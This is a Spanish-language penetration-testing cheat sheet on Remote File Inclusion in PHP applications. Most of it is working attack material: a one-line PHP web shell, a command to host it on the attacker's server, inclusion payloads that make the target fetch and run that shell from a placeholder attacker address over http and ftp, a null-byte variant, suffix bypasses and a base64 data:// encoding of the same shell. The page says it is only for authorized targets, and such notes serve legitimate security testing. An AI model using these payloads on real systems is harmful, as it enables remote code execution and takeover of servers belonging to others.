# RFI — Remote File Inclusion

Ver índice: [lfi-rfi.md](lfi-rfi.md). **Solo sobre objetivos autorizados.**

## Qué es

La app incluye un fichero desde una **URL remota** controlada por el atacante. Menos común hoy porque requiere configuración permisiva (`allow_url_include=On` en PHP), pero cuando existe da RCE directa.

## Explotación

1. Aloja tu payload en un servidor tuyo:
```
# shell.txt  ->  <?php system($_GET['c']); ?>
python3 -m http.server 80
```
2. Fuerza la inclusión remota:
```
?page=http://TU-IP/shell.txt
?page=http://TU-IP/shell.txt%00        # null byte legacy si hay sufijo
?page=ftp://TU-IP/shell.txt
```
3. Ejecuta: `...&c=id`.

## Bypass

```
- Añadir parámetros para romper un sufijo fijo:  ?page=http://TU-IP/shell.txt?
- data:// wrapper si allow_url_include está activo:
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

## Notas

- Si RFI está bloqueado pero hay LFI, ve por [lfi-to-rce.md](lfi-to-rce.md).
